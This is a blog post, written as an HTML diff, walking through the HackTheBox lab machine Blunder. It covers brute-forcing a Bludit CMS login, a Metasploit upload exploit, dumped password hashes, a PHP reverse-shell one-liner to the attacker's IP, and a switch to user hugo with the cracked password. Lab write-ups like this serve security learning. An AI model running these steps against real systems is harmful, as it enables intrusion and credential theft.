@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Daniel Cano">
+<meta name="description" content="Writeup about the Hackthebox retired machine Blunder 10.10.10.191">
+<meta name="keywords" content="hacking, technology, programming">
+<meta name="referrer" content="always">
+<meta property="og:description" content="Writeup about the Hackthebox retired machine Blunder 10.10.10.191">
+<meta property="og:title" content="Writeup Hackthebox HTB Blunder">
+<meta property="og:url" content="https://u915.net/posts/2020/10/writeup-hackthebox-htb-blunder/">
+<meta property="og:image" content="https://u915.net/images/logo_small.png" />
+<title>Writeup Hackthebox HTB Blunder - u915</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+<link rel="icon" href="/images/favicon.png" type="image/x-icon">
+<link rel="shortcut icon" href="/images/favicon_48_48.png">
+</head>
+<body>
+<header>
+  <div class="blog-header">
+    <h1><a href="https://u915.net/">u915</a></h1>
+    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merchán - Hacking &amp; Tech</h4>
+  </div>
+  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Writeup Hackthebox HTB Blunder</h1>
+  </div>
+<div class="meta">
+  <div class="meta-bar">2020-10-17
+  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
+      <span><a href="https://u915.net/tags/hackthebox/">#Hackthebox</a></span>
+      <span><a href="https://u915.net/tags/pentesting/">#Pentesting</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h2 id="0---basic-info">0 - Basic info</h2>
+<p>OS: Linux</p>
+<p>IP: 10.10.10.191</p>
+<h2 id="1---reconnaissance-and-enumeration">1 - Reconnaissance and enumeration</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sV -sC -O 10.10.10.191
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-07-28 22:24 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.191
+Host is up <span style="color:#f92672">(</span>0.041s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Blunder | A blunder of interesting facts
+Aggressive OS guesses: HP P2000 G3 NAS device <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Infomir MAG-250 set-top box <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Ubiquiti AirMax NanoStation WAP <span style="color:#f92672">(</span>Linux 2.6.32<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Ubiquiti AirOS 5.5.9 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Linux 2.6.32 - 3.13 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 3.3 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 2.6.32 - 3.1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 3.7 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Netgear RAIDiator 4.2.21 <span style="color:#f92672">(</span>Linux 2.6.37<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 18.48 seconds
+</code></pre></div><p>The firts scan with Dirbuster, shows the admin page <em>/admin</em>, <em>/todo.txt</em> and the <em>robots.txt</em>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.10.191/admin/
+</code></pre></div><p>In the admin panel, appears BLUDIT. A quick Googling says that Bludit is a CMS for blogging.</p>
+<p>Nothing useful on <em>robots.txt</em> but inside <em>todo.txt</em> there is interesting info:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.191/todo.txt
+
+-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+</code></pre></div><p>The firts user is fergus and <em>Update the CMS</em> is very interesting because there is a flaw discovered by the admin of the site probably related to the software involved in the site.</p>
+<p>So, searching exploits for Bludit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit bludit
+
+Bludit - Directory Traversal Image File Upload <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>
+Bludit 3.9.12 - Directory Traversal 
+bludit Pages Editor 3.0.0 - Arbitrary File Upload
+</code></pre></div><p>Looking the source code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- CSS --&gt;</span>
+&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2&#34;</span>&gt;
+&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2&#34;</span>&gt;
+&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css?version=3.9.2&#34;</span>&gt;
+</code></pre></div><p>The Bludit version is <em>3.9.2</em></p>
+<h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
+<p>Also I found:</p>
+<p><a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">https://rastating.github.io/bludit-brute-force-mitigation-bypass/</a></p>
+<p>This post is about how to bypass the CSFR token validation to bruteforce Bludit. I can&rsquo;t use Hydra by default, so I need to find something to bruteforce the admin page.</p>
+<h2 id="3---exploit">3 - Exploit</h2>
+<p>Bludit 3.9.2 exploit:</p>
+<p><a href="https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master">https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master</a></p>
+<p>Using the user <em>Fergus</em> and bruteforcing with the famous wordlist rockyou.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python exploit.py 10.10.10.191 fergus /usr/share/wordlists/rockyou.txt
+</code></pre></div><p>But did not work.</p>
+<p>Testing again using a custom wordlist using cewl, because is a Blog and there is a great source of information maybe there is something inside that the blogger used as password.</p>
+<h3 id="custom-wordlist">Custom wordlist</h3>
+<p><a href="https://tools.kali.org/password-attacks/cewl">https://tools.kali.org/password-attacks/cewl</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cewl -d <span style="color:#ae81ff">2</span> -m <span style="color:#ae81ff">6</span> -w docswords.txt 10.10.10.191
+</code></pre></div><p>And bruteforcing again</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python exploit.py 10.10.10.191 fergus custom.txt 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Plugins
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Include
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: service
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Stadia
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Dynamic
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: blunder
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: interesting
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: devices
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Google
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: content
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: created
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Creation
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: November
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Reading
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: minute
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Awards
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Fantasy
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: National
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: players
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: allows
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: stream
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: description
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Favicon
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Bootstrap
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: bootstrap
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Styles
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Robots
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: plugin
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Navbar
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Static
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Social
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Networks
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Content
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Stephen
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Sidebar
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: nothing
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Footer
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Copyright
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Powered
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: byEgotisticalSW
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Javascript
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: American
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: fiction
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: novels
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: feature
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: series
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: published
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: received
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: awarded
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: literature
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: centers
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: through
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: smartphones
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: tablets
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: library
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Breaked
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: button
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: September
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: author
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: horror
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: supernatural
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: suspense
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: fantasy
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: million
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: copies
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: adapted
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: miniseries
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: television
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: including
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Richard
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Bachman
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: written
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: approximately
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: stories
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: collections
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Stoker
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: British
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Society
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Foundation
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Distinguished
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Contribution
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: Letters
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: probably
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: fictional
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: character
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying: RolandDeschain
+<span style="color:#f92672">()</span>
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.
+<span style="color:#f92672">()</span>
+</code></pre></div><p>Great the password is RolandDeschain and I can login into the admin panel.</p>
+<p><img src="/images/posts/htb_blunder_1.png" alt="alt text" title="Bludit admin panel with Fergus"></p>
+<h3 id="metasploit">Metasploit</h3>
+<p>Now I can use one of the previous exploits. This time I used Metasploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">linux/http/bludit_upload_images_exec
+
+msf5 exploit<span style="color:#f92672">(</span>linux/http/bludit_upload_images_exec<span style="color:#f92672">)</span> &gt; exploit
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.5:8443 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged in as: fergus
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving UUID...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading zcoxmsbSZa.png...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading .htaccess...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing zcoxmsbSZa.png...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.5:8443 -&gt; 10.10.10.191:39706<span style="color:#f92672">)</span> at 2020-07-29 20:18:58 +0200
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted .htaccess
+
+pwd
+/var/www/bludit-3.9.2/bl-content/tmp
+
+</code></pre></div><p>Good, shell access. I am not able to get any user flag, so I need to gain User access.</p>
+<h3 id="user-hashes">User hashes</h3>
+<p>Enumerating the blog source code I found:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">cat users.php
+
+<span style="color:#75715e">&lt;?php</span> <span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;BLUDIT&#39;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Bludit CMS.&#39;</span>); <span style="color:#75715e">?&gt;</span>
+{
+    &#34;admin&#34;: {
+        &#34;nickname&#34;: &#34;Admin&#34;,
+        &#34;firstName&#34;: &#34;Administrator&#34;,
+        &#34;lastName&#34;: &#34;&#34;,
+        &#34;role&#34;: &#34;admin&#34;,
+        &#34;password&#34;: &#34;bfcc887f62e36ea019e3295aafb8a3885966e265&#34;,
+        &#34;salt&#34;: &#34;5dde2887e7aca&#34;,
+        &#34;email&#34;: &#34;&#34;,
+        &#34;registered&#34;: &#34;2019-11-27 07:40:55&#34;,
+        &#34;tokenRemember&#34;: &#34;&#34;,
+        &#34;tokenAuth&#34;: &#34;b380cb62057e9da47afce66b4615107d&#34;,
+        &#34;tokenAuthTTL&#34;: &#34;2009-03-15 14:00&#34;,
+        &#34;twitter&#34;: &#34;&#34;,
+        &#34;facebook&#34;: &#34;&#34;,
+        &#34;instagram&#34;: &#34;&#34;,
+        &#34;codepen&#34;: &#34;&#34;,
+        &#34;linkedin&#34;: &#34;&#34;,
+        &#34;github&#34;: &#34;&#34;,
+        &#34;gitlab&#34;: &#34;&#34;
+    },
+    &#34;fergus&#34;: {
+        &#34;firstName&#34;: &#34;&#34;,
+        &#34;lastName&#34;: &#34;&#34;,
+        &#34;nickname&#34;: &#34;&#34;,
+        &#34;description&#34;: &#34;&#34;,
+        &#34;role&#34;: &#34;author&#34;,
+        &#34;password&#34;: &#34;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7&#34;,
+        &#34;salt&#34;: &#34;jqxpjfnv&#34;,
+        &#34;email&#34;: &#34;&#34;,
+        &#34;registered&#34;: &#34;2019-11-27 13:26:44&#34;,
+        &#34;tokenRemember&#34;: &#34;&#34;,
+        &#34;tokenAuth&#34;: &#34;0e8011811356c0c5bd2211cba8c50471&#34;,
+        &#34;tokenAuthTTL&#34;: &#34;2009-03-15 14:00&#34;,
+        &#34;twitter&#34;: &#34;&#34;,
+        &#34;facebook&#34;: &#34;&#34;,
+        &#34;codepen&#34;: &#34;&#34;,
+        &#34;instagram&#34;: &#34;&#34;,
+        &#34;github&#34;: &#34;&#34;,
+        &#34;gitlab&#34;: &#34;&#34;,
+        &#34;linkedin&#34;: &#34;&#34;,
+        &#34;mastodon&#34;: &#34;&#34;
+    }
+}
+</code></pre></div><h3 id="identifying-the--hashes">Identifying the  hashes</h3>
+<p>2 users with hashes.</p>
+<p>Using hash-identifier to identify the hashes:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hash-identifier bfcc887f62e36ea019e3295aafb8a3885966e265
+
+Possible Hashs:
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-1
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MySQL5 - SHA-1<span style="color:#f92672">(</span>SHA-1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+
+Least Possible Hashs:
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tiger-160
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-160
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RipeMD-160
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-1<span style="color:#f92672">(</span>HMAC<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tiger-160<span style="color:#f92672">(</span>HMAC<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RipeMD-160<span style="color:#f92672">(</span>HMAC<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-160<span style="color:#f92672">(</span>HMAC<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-1<span style="color:#f92672">(</span>MaNGOS<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-1<span style="color:#f92672">(</span>MaNGOS2<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$pass.$salt<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.$pass<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.md5<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.md5<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)</span>.$salt<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.sha1<span style="color:#f92672">(</span>$salt.sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$username.$pass<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$username.$pass.$salt<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>md5<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>md5<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)</span>.$salt<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>md5<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)</span>.$salt<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)</span>.substr<span style="color:#f92672">(</span>$pass,0,3<span style="color:#f92672">))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$salt.$pass<span style="color:#f92672">))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)))</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>strtolower<span style="color:#f92672">(</span>$username<span style="color:#f92672">)</span>.$pass<span style="color:#f92672">)</span>
+--------------------------------------------------
+ HASH: exit
+
+ Not Found.
+--------------------------------------------------
+
+</code></pre></div><p>But I could not crack the hash or find it on any <em>crackinghash</em> websites.</p>
+<h3 id="hash-2">Hash #2</h3>
+<p>Enumerating again I found a another version (3.10.0a) of Bludit with another user and pass configuration file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/var/bludit/3.10.0a/bl-content/databases/users.php
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;BLUDIT&#39;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Bludit CMS.&#39;</span>); <span style="color:#75715e">?&gt;</span>
+{
+    &#34;admin&#34;: {
+        &#34;nickname&#34;: &#34;Hugo&#34;,
+        &#34;firstName&#34;: &#34;Hugo&#34;,
+        &#34;lastName&#34;: &#34;&#34;,
+        &#34;role&#34;: &#34;User&#34;,
+        &#34;password&#34;: &#34;faca404fd5c0a31cf1897b823c695c85cffeb98d&#34;,
+        &#34;email&#34;: &#34;&#34;,
+        &#34;registered&#34;: &#34;2019-11-27 07:40:55&#34;,
+        &#34;tokenRemember&#34;: &#34;&#34;,
+        &#34;tokenAuth&#34;: &#34;b380cb62057e9da47afce66b4615107d&#34;,
+        &#34;tokenAuthTTL&#34;: &#34;2009-03-15 14:00&#34;,
+        &#34;twitter&#34;: &#34;&#34;,
+        &#34;facebook&#34;: &#34;&#34;,
+        &#34;instagram&#34;: &#34;&#34;,
+        &#34;codepen&#34;: &#34;&#34;,
+        &#34;linkedin&#34;: &#34;&#34;,
+        &#34;github&#34;: &#34;&#34;,
+        &#34;gitlab&#34;: &#34;&#34;}
+}
+</code></pre></div><p>New user Hugo with password hash. This time I was lucky and the password is already cracked</p>
+<p><img src="/images/posts/htb_blunder_2.png" alt="alt text" title="Bludit cracking the hash for Hugo"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Password120
+</code></pre></div><h3 id="another-reverse-shell-">Another reverse shell ?</h3>
+<p>Great I tried to use the user Hugo but my shell sucks and was unstable&hellip;</p>
+<p>Started another reverse Shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvp <span style="color:#ae81ff">8888</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;10.10.14.5&#34;,8888);exec(&#34;/bin/sh -i <span style="color:#960050;background-color:#1e0010">&lt;&amp;</span>3 &gt;<span style="color:#960050;background-color:#1e0010">&amp;</span>3 2&gt;&amp;3&#34;);&#39;
+</code></pre></div><p>And upgraded the shell with Python:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</code></pre></div><h3 id="user-shell-and-flag">User shell and flag</h3>
+<p>Now I can log in as Hugo:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ su - hugo
+Password: Password120
+
+hugo@blunder:~$ ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+
